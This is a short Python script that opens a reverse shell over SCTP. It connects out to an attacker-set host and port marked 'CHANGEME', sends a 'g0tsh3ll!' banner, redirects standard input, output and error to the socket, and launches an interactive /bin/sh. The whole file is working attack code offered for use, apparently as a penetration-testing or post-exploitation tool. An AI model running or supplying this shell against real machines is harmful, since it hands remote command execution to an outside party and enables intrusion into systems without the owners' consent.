#!/usr/bin/python
import socket
import _sctp
import sctp
from sctp import *
import os
import subprocess

host = '127.0.0.1' # CHANGEME
port = 1337 # CHANGEME

socket.setdefaulttimeout(60)
s = None
try:
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((host,port))
    s.send('g0tsh3ll!\n')
    save = [ os.dup(i) for i in range(0,3) ]
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    shell = subprocess.call(["/bin/sh","-i"])
    [ os.dup2(save[i],i) for i in range(0,3)]
    [ os.close(save[i]) for i in range(0,3)]
    os.close(s.fileno())
except Exception:
    print "Connection Failed! Is there even a listener?"
    pass
